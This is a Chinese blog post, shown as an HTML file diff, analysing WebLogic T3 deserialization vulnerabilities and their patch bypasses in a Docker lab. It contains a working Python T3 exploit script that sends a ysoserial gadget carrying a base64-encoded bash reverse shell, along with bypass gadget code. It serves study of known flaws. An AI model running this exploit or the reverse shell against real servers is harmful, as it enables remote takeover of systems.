@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="mayylu">
+
+
+
+    <meta name="description" content="学习是一种生活态度">
+
+
+
+<title>weblogic 反序列化 | mayylu&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/vue.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">mayylu&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">mayylu&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">weblogic 反序列化</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">mayylu</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 6, 2024&nbsp;&nbsp;</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/java/">java</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>早在四月份就想搞了，因为看到有人拿这个水洞，可是环境一直有问题就耽搁下来了，直到最近在实战中又遇到了，就又重新试试环境，结果发现docker的问题，真是绕了好大一圈，也不知道还能不能挖出来cve<br> <span id="more"></span></p>
+<p>WebLogic 是由 Oracle 提供的一个企业级应用服务器(类似于Tomcat)，支持 Java EE规范。它是一款全功能的应用服务器，具备高可扩展性，高效的应用集群，负载均衡能力和复杂的企业级服务，提供了丰富的管理控制台，允许管理员通过图形界面进行服务器配置、部署、监控等</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>搭环境遇到了很多问题，什么年代了还用centos(狗头)，这是我最后成功的dockerfile</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基础镜像</span></span><br><span class="line">FROM centos:8</span><br><span class="line"><span class="comment"># 参数</span></span><br><span class="line">ARG JDK_PKG</span><br><span class="line">ARG WEBLOGIC_JAR</span><br><span class="line"></span><br><span class="line">RUN rm -f /etc/yum.repos.d/*</span><br><span class="line">RUN curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-8.repo</span><br><span class="line">RUN  yum clean all</span><br><span class="line">RUN  yum makecache</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解决libnsl包丢失的问题</span></span><br><span class="line">RUN yum install -y libnsl</span><br></pre></td></tr></table></figure>
+<p><strong>注意：</strong>还有不用了一定把docker对应的容器给关了</p>
+<h3 id="配置远程调试"><a href="#配置远程调试" class="headerlink" title="配置远程调试"></a>配置远程调试</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk8u202 weblogic1036jdk8u202 <span class="comment">#额外开放8453端口</span></span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -it weblogic /bin/bash <span class="comment">#进入容器</span></span><br><span class="line">vi /root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh</span><br><span class="line"><span class="comment">#在最上方添加</span></span><br><span class="line">debugFlag=<span class="string">&quot;true&quot;</span></span><br><span class="line"><span class="built_in">export</span> debugFlag </span><br><span class="line"></span><br><span class="line">quit</span><br><span class="line"></span><br><span class="line">docker restart 容器id</span><br><span class="line">docker cp weblogic:/root ./weblogic_jars <span class="comment">#把  weblogic的源码和jdk包都拷贝出来</span></span><br><span class="line">copy /Y <span class="string">&quot;E:\user\Desktop\java\weblogic\weblogic_10.3.6\Oracle\Middleware\wlserver_10.3\sip\server\lib\wlss_i18n.jar&quot;</span> <span class="string">&quot;.\test&quot;</span> </span><br><span class="line"><span class="comment">#导出jar包依赖，并在libraries下添加test目录</span></span><br><span class="line"><span class="comment">#在jdk这块选用weblogic10.3.6自带的jdk6</span></span><br><span class="line"><span class="comment">#添加远程服务器</span></span><br><span class="line"><span class="comment">#出现启动调试，出现已连接到目标 VM, 地址: &#x27;&#x27;192.168.58.130:8453&#x27;，传输: &#x27;套接字&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ20241106-005345.png" alt="QQ20241106-005345"><br>终于成了，十分有九分的不容易</p>
+<h2 id="T3协议"><a href="#T3协议" class="headerlink" title="T3协议"></a>T3协议</h2><p>Java RMI 的基础通信协议是 JRMP,而WebLogic T3协议是Oracle WebLogic Server中用于通信的协议之一。它基于Java语言，通过TCP/IP协议进行通信，通常使用在Java EE应用程序与WebLogic Server之间的通信中。</p>
+<p>默认情况下，管理控制台的端口是 7001，应用是 7003，节点管理器是 5556，初次部署时需要注意让防火墙放行这三个端口。</p>
+<p>因为第一部分会校验数据包长度，如果长度不匹配weblogic会报java.io.EOFException异常。<br>通过构造第一部分的非Java数据(前4个字节为数据长度)+第二部分拼接我们恶意的序列化数据，即可触发漏洞。</p>
+<h3 id="发送协议脚本"><a href="#发送协议脚本" class="headerlink" title="发送协议脚本"></a>发送协议脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> popen</span><br><span class="line"><span class="keyword">import</span> struct  <span class="comment"># 负责大小端的转换</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> stdout</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generatePayload</span>(<span class="params">gadget, cmd</span>):</span></span><br><span class="line">    YSO_PATH = <span class="string">&quot;/home/bmth/web/ysoserial-0.0.6-SNAPSHOT-all.jar&quot;</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, YSO_PATH, gadget, cmd], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">T3Exploit</span>(<span class="params">ip, port, payload</span>):</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip, port))</span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span></span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    data += sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">compile</span> = re.<span class="built_in">compile</span>(<span class="string">&quot;HELO:(.*).0.false&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data.decode())</span><br><span class="line">    match = <span class="built_in">compile</span>.findall(data.decode())</span><br><span class="line">    <span class="keyword">if</span> match:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Weblogic: &quot;</span> + <span class="string">&quot;&quot;</span>.join(match))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    header = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>)</span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>)</span><br><span class="line">    desflag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>)</span><br><span class="line">    payload = header + t3header + desflag + payload</span><br><span class="line">    payload = struct.pack(<span class="string">&quot;&gt;I&quot;</span>, <span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:]</span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ip = <span class="string">&quot;192.168.111.178&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">&quot;CommonsCollections1&quot;</span></span><br><span class="line">    cmd = <span class="string">&quot;bash -c &#123;echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTkyLjE2OC4xMTEuMTc4LzY2NjYgPCYxJw==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br><span class="line">    payload = generatePayload(gadget, cmd)</span><br><span class="line">    T3Exploit(ip, port, payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>因为发送脚本没有太大变化，下面就只分析发送的payload</p>
+<h3 id="T3反序列化"><a href="#T3反序列化" class="headerlink" title="T3反序列化"></a>T3反序列化</h3><h4 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h4><p>漏洞点处于<code>wlthint3client.jar!\weblogic\rjvm\InboundMsgAbbrev.class#readObject</code>,该方法会反序列化我们传入的payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">private</span> Object <span class="title">readObject</span><span class="params">(MsgAbbrevInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> var2 = var1.read();</span><br><span class="line">        <span class="keyword">switch</span> (var2) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>: </span><br><span class="line">                <span class="keyword">return</span> (<span class="keyword">new</span> ServerChannelInputStream(var1)).readObject(); </span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> var1.readASCII();</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(<span class="string">&quot;Unknown typecode: &#x27;&quot;</span> + var2 + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ServerChannelInputStream</span> <span class="keyword">extends</span> <span class="title">ObjectInputStream</span> <span class="keyword">implements</span> <span class="title">ServerChannelStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> ServerChannel serverChannel;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="title">ServerChannelInputStream</span><span class="params">(MsgAbbrevInputStream var1)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(var1);<span class="comment">//super为ObjectInputstream类，及反序列化var1</span></span><br><span class="line">            <span class="keyword">this</span>.serverChannel = var1.getServerChannel();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>修复就是直接在<strong>ServerChannelInputStream#resolveClass</strong>里设置黑名单</p>
+<h5 id="resolveClass"><a href="#resolveClass" class="headerlink" title="resolveClass"></a>resolveClass</h5><p>这里直接看ObjectInputStream#resolveClass,可以看到所有类的初始化都会在resolveClass方法中进行，如果重写了该方法，就可以有效的设置黑名单，ctf中也经常遇到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line"><span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">   &#123;</span><br><span class="line">String name = desc.getName();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Class.forName(name, <span class="keyword">false</span>, latestUserDefinedLoader());</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">    Class cl = (Class) primClasses.get(name);</span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="keyword">null</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> cl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">resolveClass:680, ObjectInputStream (java.io)</span><br><span class="line">readNonProxyDesc:1859, ObjectInputStream (java.io)</span><br><span class="line">readClassDesc:1745, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:2033, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1567, ObjectInputStream (java.io)</span><br><span class="line">readObject:427, ObjectInputStream (java.io)</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h4><h5 id="二次反序列化的理念"><a href="#二次反序列化的理念" class="headerlink" title="二次反序列化的理念"></a>二次反序列化的理念</h5><p>那么怎么绕过resolveClass，前面说了这个黑名单限制经常在ctf中用来出题(当然我做的ctf题目肯定没这个cve早)，ctf中有一种绕过方法，就是<strong>二次反序列化</strong>，最经典的莫过于原生的java.security.SignedObject#getObject()<br><strong>及在一个方法中再次反序列化，只要readobject在到达该方法前没有触发黑名单，就可以绕过</strong></p>
+<h5 id="Externalizable接口"><a href="#Externalizable接口" class="headerlink" title="Externalizable接口"></a>Externalizable接口</h5><p>Externalizable接口继承了Serializable接口，所以实现Externalizable接口也能实现序列化和反序列化。<br>Externalizable接口中定义了writeExternal和readExternal两个抽象方法，通过注释，可以看出这两个方法其实对应Serializable接口的writeObject和readObject方法。</p>
+<p>readExternal 需要开发者手动处理对象的每一个字段的读取过程。它不像 Serializable 那样有默认的机制，而是需要手动指定如何从流中读取每个字段的值。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<span class="comment">//in为反序列化流</span></span><br><span class="line">    someField = in.readInt();  <span class="comment">// 手动读取</span></span><br><span class="line">    anotherField = in.readUTF();  <span class="comment">// 手动读取其他字段</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在调用readObject()时，如果类实现的是Externalizable接口，则会调用<strong>readExternal方法</strong></p>
+<h5 id="StreamMessageImpl-readExternal"><a href="#StreamMessageImpl-readExternal" class="headerlink" title="StreamMessageImpl#readExternal"></a>StreamMessageImpl#readExternal</h5><p>找到了个黑名单之外的类<strong>weblogic.jms.common.StreamMessageImpl#readExternal</strong> 会readObject一部分传入的payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">       <span class="keyword">super</span>.readExternal(var1);</span><br><span class="line">       <span class="keyword">byte</span> var2 = var1.readByte();</span><br><span class="line">       <span class="keyword">byte</span> var3 = (<span class="keyword">byte</span>)(var2 &amp; <span class="number">127</span>);</span><br><span class="line">       <span class="keyword">if</span> (var3 &gt;= <span class="number">1</span> &amp;&amp; var3 &lt;= <span class="number">3</span>) &#123;</span><br><span class="line">           <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">               <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                   <span class="keyword">this</span>.payload = (PayloadStream)PayloadFactoryImpl.createPayload((InputStream)var1);</span><br><span class="line">                   BufferInputStream var4 = <span class="keyword">this</span>.payload.getInputStream();</span><br><span class="line">                   ObjectInputStream var5 = <span class="keyword">new</span> ObjectInputStream(var4);</span><br><span class="line">                   <span class="keyword">this</span>.setBodyWritable(<span class="keyword">true</span>);</span><br><span class="line">                   <span class="keyword">this</span>.setPropertiesWritable(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">                   <span class="keyword">try</span> &#123;</span><br><span class="line">                       <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                           <span class="keyword">this</span>.writeObject(var5.readObject());<span class="comment">//</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="CVE-2016-0638-1"><a href="#CVE-2016-0638-1" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h4><p>这是对补丁的另一个绕过方法</p>
+<h5 id="readResolve"><a href="#readResolve" class="headerlink" title="readResolve"></a>readResolve</h5><p>**默认方法readResolve()**是Serializable 接口的一部分。当一个对象被反序列化时，readResolve方法会在readObject之后调用</p>
+<p>及在调用readObject()时，如果被反序列化的这个类有重写<strong>readResolve方法</strong>，则会调用</p>
+<h5 id="MarshalledObject-readResolve"><a href="#MarshalledObject-readResolve" class="headerlink" title="MarshalledObject#readResolve"></a>MarshalledObject#readResolve</h5><p> weblogic.corba.utils.MarshalledObject#readResolve 会readObject一个参数，造成二次反序列化</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">MarshalledObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">byte</span>[] objBytes = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> hash;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MarshalledObject</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.hash = <span class="number">13</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            ObjectOutputStream out = <span class="keyword">new</span> MarshalledObjectOutputStream(baos);</span><br><span class="line">            out.writeObject(obj);</span><br><span class="line">            out.flush();</span><br><span class="line">            <span class="keyword">this</span>.objBytes = baos.toByteArray(); <span class="comment">//将传入的obj封装到objBytes中，并计算hash值</span></span><br><span class="line">            <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.objBytes.length; ++i) &#123;</span><br><span class="line">                h = <span class="number">31</span> * h + <span class="keyword">this</span>.objBytes[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>.hash = h;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">....................</span><br><span class="line"> <span class="function"><span class="keyword">public</span> Object <span class="title">readResolve</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, ObjectStreamException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.objBytes == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ByteArrayInputStream bin = <span class="keyword">new</span> ByteArrayInputStream(<span class="keyword">this</span>.objBytes);</span><br><span class="line">            ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bin);</span><br><span class="line">            Object obj = in.readObject();<span class="comment">//反序列化</span></span><br><span class="line">            in.close();</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br></pre></td></tr></table></figure>
+<p>我们在序列化时，构造方法封装上恶意的objBytes，在反序列化readObject触发readResolve时就可以二次反序列化了</p>
+<h4 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h4><p>通过JRMP 协议达到执行任意反序列化</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">    TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">    UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">    RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line"></span><br><span class="line">    Registry proxy = (Registry) Proxy.newProxyInstance(BypassPayloadSelector.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;</span><br><span class="line">        Registry.class</span><br><span class="line">            &#125;, obj);<span class="comment">//利用java.rmi.registry.Registry，序列化RemoteObjectInvocationHandler</span></span><br><span class="line">    <span class="keyword">return</span> proxy;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>反序列化分析</p>
+<p>在proxy的反序列化的过程中会实例化对应的InvocationHandler，于是就调用了InvocationHandler的readObject方法 (不知道为什么非要套一层proxy,我本地试的是可以直接反序列化的)</p>
